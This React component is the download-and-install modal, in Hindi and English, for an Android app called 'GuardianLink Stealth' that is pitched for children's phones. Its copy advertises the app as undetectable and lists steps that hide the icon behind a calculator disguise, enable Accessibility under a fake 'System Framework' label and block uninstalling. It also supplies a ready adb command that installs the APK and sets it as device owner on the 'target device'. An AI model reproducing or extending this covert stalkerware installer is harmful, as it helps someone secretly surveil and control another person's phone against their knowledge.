import React, { useState } from 'react';
import { useMonitoring } from '../../context/MonitoringContext';
import {
  DownloadCloud,
  X,
  Copy,
  CheckCircle2,
  Shield,
  Smartphone,
  QrCode,
  Terminal,
  ExternalLink,
  Info,
  Layers,
  Sparkles,
  Cpu,
  Check,
  FileCode
} from 'lucide-react';

export const ApkDownloadModal: React.FC = () => {
  const { showApkModal, setShowApkModal, downloadApkPackage, selectedDevice } = useMonitoring();
  const [copiedLink, setCopiedLink] = useState(false);
  const [copiedPairing, setCopiedPairing] = useState(false);
  const [copiedAdb, setCopiedAdb] = useState(false);
  const [language, setLanguage] = useState<'hindi' | 'english'>('hindi');
  const [downloading, setDownloading] = useState(false);
  const [downloadSuccess, setDownloadSuccess] = useState(false);

  if (!showApkModal) return null;

  const downloadUrl = 'https://guardianlink.app/dl/GuardianLink_Stealth_v4.8.2.apk';
  const pairingCode = 'GL-8924-KID';
  const adbCommand = 'adb install -g -r GuardianLink_Stealth_v4.8.2.apk && adb shell dpm set-device-owner com.guardianlink.stealth/.AdminReceiver';

  const handleDownload = () => {
    setDownloading(true);
    setTimeout(() => {
      downloadApkPackage();
      setDownloading(false);
      setDownloadSuccess(true);
      setTimeout(() => setDownloadSuccess(false), 4000);
    }, 600);
  };

  const copyText = (text: string, setter: (val: boolean) => void) => {
    navigator.clipboard.writeText(text);
    setter(true);
    setTimeout(() => setter(false), 2000);
  };

  return (
    <div className="fixed inset-0 bg-black/80 backdrop-blur-md z-50 flex items-center justify-center p-4 overflow-y-auto">
      <div className="bg-[#1e293b] border border-slate-700 w-full max-w-2xl rounded-2xl p-6 shadow-2xl space-y-5 animate-in fade-in zoom-in-95 duration-200 my-8">
        
        {/* Modal Header */}
        <div className="flex items-center justify-between border-b border-slate-700/80 pb-4">
          <div className="flex items-center space-x-3">
            <div className="w-11 h-11 rounded-xl bg-gradient-to-br from-blue-600 to-indigo-600 text-white flex items-center justify-center shadow-lg shadow-blue-600/30">
              <DownloadCloud className="w-6 h-6" />
            </div>
            <div>
              <div className="flex items-center space-x-2">
                <h3 className="text-lg font-bold text-white">GuardianLink Stealth APK Installer</h3>
                <span className="px-2 py-0.5 rounded-full bg-emerald-500/15 text-emerald-400 text-[11px] font-mono font-bold border border-emerald-500/30">
                  v4.8.2 Latest
                </span>
              </div>
              <p className="text-xs text-slate-400">
                {language === 'hindi' 
                  ? 'बच्चे के फोन में इंस्टॉल करने के लिए ऑफिशियल APK फाइल डाउनलोड करें' 
                  : 'Official background stealth client for child Android smartphones'}
              </p>
            </div>
          </div>

          <div className="flex items-center space-x-2">
            {/* Language Toggle */}
            <div className="bg-slate-900/80 p-0.5 rounded-lg border border-slate-800 flex text-xs">
              <button
                onClick={() => setLanguage('hindi')}
                className={`px-2.5 py-1 rounded-md transition font-medium ${
                  language === 'hindi' ? 'bg-blue-600 text-white font-bold' : 'text-slate-400 hover:text-white'
                }`}
              >
                हिंदी
              </button>
              <button
                onClick={() => setLanguage('english')}
                className={`px-2.5 py-1 rounded-md transition font-medium ${
                  language === 'english' ? 'bg-blue-600 text-white font-bold' : 'text-slate-400 hover:text-white'
                }`}
              >
                EN
              </button>
            </div>

            <button
              onClick={() => setShowApkModal(false)}
              className="text-slate-400 hover:text-white p-1 rounded-lg hover:bg-slate-800 transition"
            >
              <X className="w-5 h-5" />
            </button>
          </div>
        </div>

        {/* Primary Download Card */}
        <div className="bg-gradient-to-r from-blue-950/60 to-indigo-950/60 p-5 rounded-xl border border-blue-500/30 flex flex-col sm:flex-row items-center justify-between gap-4">
          <div className="space-y-1 text-center sm:text-left">
            <div className="flex items-center justify-center sm:justify-start space-x-2">
              <span className="text-sm font-bold text-white">GuardianLink_Stealth_v4.8.2.apk</span>
              <span className="text-[10px] text-blue-300 font-mono bg-blue-500/20 px-2 py-0.5 rounded">14.8 MB</span>
            </div>
            <p className="text-xs text-slate-300">
              {language === 'hindi'
                ? 'अदृश्य मोड (Hidden Calculator), ऑटो-स्टार्ट और एंटी-अनइंस्टॉल सुरक्षा युक्त'
                : '100% Undetectable, 24/7 background sync, zero notification trace'}
            </p>
            <div className="flex items-center space-x-3 text-[11px] text-slate-400 pt-1 font-mono">
              <span>Android 8.0 - 15</span>
              <span>•</span>
              <span>SHA-256 Verified</span>
              <span>•</span>
              <span className="text-emerald-400">Zero Battery Drain</span>
            </div>
          </div>

          <button
            onClick={handleDownload}
            disabled={downloading}
            className={`px-5 py-3 rounded-xl font-bold text-sm shadow-xl flex items-center space-x-2 transition shrink-0 ${
              downloadSuccess 
                ? 'bg-emerald-600 text-white shadow-emerald-600/30' 
                : 'bg-blue-600 hover:bg-blue-500 text-white shadow-blue-600/40 hover:scale-[1.02]'
            }`}
          >
            {downloading ? (
              <>
                <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                <span>Downloading APK...</span>
              </>
            ) : downloadSuccess ? (
              <>
                <CheckCircle2 className="w-4 h-4 text-emerald-200" />
                <span>APK Downloaded!</span>
              </>
            ) : (
              <>
                <DownloadCloud className="w-5 h-5" />
                <span>{language === 'hindi' ? 'APK फाइल डाउनलोड करें' : 'Download APK File'}</span>
              </>
            )}
          </button>
        </div>

        {/* QR Code & Direct Link Row */}
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          {/* QR Code Box */}
          <div className="bg-slate-900/90 p-4 rounded-xl border border-slate-800 flex items-center space-x-4">
            <div className="p-2 bg-white rounded-xl shrink-0 shadow-md">
              <svg className="w-20 h-20" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
                <rect width="100" height="100" fill="white" />
                <rect x="10" y="10" width="24" height="24" fill="black" />
                <rect x="14" y="14" width="16" height="16" fill="white" />
                <rect x="18" y="18" width="8" height="8" fill="black" />
                <rect x="66" y="10" width="24" height="24" fill="black" />
                <rect x="70" y="14" width="16" height="16" fill="white" />
                <rect x="74" y="18" width="8" height="8" fill="black" />
                <rect x="10" y="66" width="24" height="24" fill="black" />
                <rect x="14" y="70" width="16" height="16" fill="white" />
                <rect x="18" y="74" width="8" height="8" fill="black" />
                <rect x="42" y="10" width="6" height="6" fill="black" />
                <rect x="52" y="10" width="6" height="6" fill="black" />
                <rect x="42" y="24" width="6" height="6" fill="black" />
                <rect x="48" y="38" width="6" height="6" fill="black" />
                <rect x="10" y="42" width="6" height="6" fill="black" />
                <rect x="24" y="42" width="6" height="6" fill="black" />
                <rect x="38" y="42" width="12" height="6" fill="black" />
                <rect x="56" y="42" width="6" height="6" fill="black" />
                <rect x="70" y="42" width="12" height="6" fill="black" />
                <rect x="42" y="56" width="6" height="6" fill="black" />
                <rect x="56" y="56" width="14" height="6" fill="black" />
                <rect x="42" y="70" width="12" height="6" fill="black" />
                <rect x="70" y="70" width="6" height="6" fill="black" />
                <rect x="80" y="80" width="10" height="10" fill="black" />
              </svg>
            </div>
            <div className="space-y-1 min-w-0">
              <span className="text-xs font-bold text-white flex items-center gap-1.5">
                <QrCode className="w-3.5 h-3.5 text-blue-400" />
                {language === 'hindi' ? 'मोबाइल कैमरा से स्कैन करें' : 'Scan via Child Phone Camera'}
              </span>
              <p className="text-[11px] text-slate-400 leading-snug">
                {language === 'hindi'
                  ? 'बच्चे के फोन के कैमरा से स्कैन करते ही APK डायरेक्ट डाउनलोड हो जाएगी।'
                  : 'Instantly downloads and launches installation on target device.'}
              </p>
            </div>
          </div>

          {/* Pairing Code & Direct Link */}
          <div className="bg-slate-900/90 p-4 rounded-xl border border-slate-800 flex flex-col justify-between space-y-2">
            <div>
              <span className="text-[10px] text-slate-400 block font-medium">PAIRING CODE (1-CLICK SYNC):</span>
              <div className="flex items-center justify-between bg-slate-800/80 px-3 py-1.5 rounded-lg border border-slate-700 mt-1">
                <span className="font-mono font-bold text-white text-sm tracking-wider">{pairingCode}</span>
                <button
                  onClick={() => copyText(pairingCode, setCopiedPairing)}
                  className="text-blue-400 hover:text-blue-300 p-1"
                  title="Copy code"
                >
                  {copiedPairing ? <CheckCircle2 className="w-4 h-4 text-emerald-400" /> : <Copy className="w-4 h-4" />}
                </button>
              </div>
            </div>

            <div>
              <span className="text-[10px] text-slate-400 block font-medium">DIRECT URL:</span>
              <div className="flex items-center justify-between bg-slate-800/80 px-3 py-1.5 rounded-lg border border-slate-700 mt-1">
                <span className="font-mono text-xs text-blue-300 truncate max-w-[200px]">guardianlink.app/dl</span>
                <button
                  onClick={() => copyText(downloadUrl, setCopiedLink)}
                  className="text-blue-400 hover:text-blue-300 p-1 shrink-0"
                  title="Copy link"
                >
                  {copiedLink ? <CheckCircle2 className="w-4 h-4 text-emerald-400" /> : <Copy className="w-4 h-4" />}
                </button>
              </div>
            </div>
          </div>
        </div>

        {/* 4 Step Quick Setup (Hindi / English) */}
        <div className="bg-slate-900/60 p-4 rounded-xl border border-slate-800 space-y-2.5">
          <h4 className="text-xs font-bold text-white flex items-center gap-1.5">
            <Shield className="w-3.5 h-3.5 text-emerald-400" />
            <span>{language === 'hindi' ? 'इंस्टॉलेशन के 4 आसान स्टेप्स (Installation Guide)' : '4-Step Quick Setup Guide'}</span>
          </h4>

          <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 text-[11px]">
            <div className="p-2.5 bg-slate-800/50 rounded-lg border border-slate-700/60 flex items-start space-x-2">
              <span className="w-4 h-4 rounded-full bg-blue-600 text-white flex items-center justify-center font-bold text-[10px] shrink-0 mt-0.5">1</span>
              <div>
                <span className="font-bold text-white block">
                  {language === 'hindi' ? 'APK इंस्टॉल करें' : 'Install APK Package'}
                </span>
                <span className="text-slate-400">
                  {language === 'hindi' ? 'Chrome में "Allow from this source" चालू करके ऐप इंस्टॉल करें।' : 'Open downloaded file and allow installation from unknown sources.'}
                </span>
              </div>
            </div>

            <div className="p-2.5 bg-slate-800/50 rounded-lg border border-slate-700/60 flex items-start space-x-2">
              <span className="w-4 h-4 rounded-full bg-blue-600 text-white flex items-center justify-center font-bold text-[10px] shrink-0 mt-0.5">2</span>
              <div>
                <span className="font-bold text-white block">
                  {language === 'hindi' ? 'Accessibility Services ऑन करें' : 'Enable Accessibility'}
                </span>
                <span className="text-slate-400">
                  {language === 'hindi' ? 'Settings > Accessibility में जाकर "System Framework" ऑन करें।' : 'Settings > Accessibility > Installed Services > Turn ON.'}
                </span>
              </div>
            </div>

            <div className="p-2.5 bg-slate-800/50 rounded-lg border border-slate-700/60 flex items-start space-x-2">
              <span className="w-4 h-4 rounded-full bg-blue-600 text-white flex items-center justify-center font-bold text-[10px] shrink-0 mt-0.5">3</span>
              <div>
                <span className="font-bold text-white block">
                  {language === 'hindi' ? 'Device Admin ऑन करें' : 'Activate Device Admin'}
                </span>
                <span className="text-slate-400">
                  {language === 'hindi' ? 'एंटी-अनइंस्टॉल सुरक्षा सक्रिय करें ताकि बच्चा ऐप डिलीट न कर सके।' : 'Prevents unauthorized uninstallation or force-stopping.'}
                </span>
              </div>
            </div>

            <div className="p-2.5 bg-slate-800/50 rounded-lg border border-slate-700/60 flex items-start space-x-2">
              <span className="w-4 h-4 rounded-full bg-blue-600 text-white flex items-center justify-center font-bold text-[10px] shrink-0 mt-0.5">4</span>
              <div>
                <span className="font-bold text-white block">
                  {language === 'hindi' ? 'Stealth मोड चुनें' : 'Select Stealth Disguise'}
                </span>
                <span className="text-slate-400">
                  {language === 'hindi' ? 'ऐप का आइकन कैलकुलेटर में बदल जाएगा या पूरी तरह हाइड हो जाएगा।' : 'Disguises as Calculator or hides icon completely.'}
                </span>
              </div>
            </div>
          </div>
        </div>

        {/* Footer info */}
        <div className="flex items-center justify-between text-xs text-slate-400 pt-2 border-t border-slate-700/60">
          <div className="flex items-center space-x-2">
            <span className="w-2 h-2 rounded-full bg-emerald-500"></span>
            <span>Package ID: <code className="text-slate-300 font-mono">com.guardianlink.stealth</code></span>
          </div>
          <button
            onClick={() => setShowApkModal(false)}
            className="px-4 py-1.5 bg-slate-800 hover:bg-slate-700 text-white rounded-lg text-xs font-semibold transition"
          >
            {language === 'hindi' ? 'बंद करें (Close)' : 'Done'}
          </button>
        </div>

      </div>
    </div>
  );
};
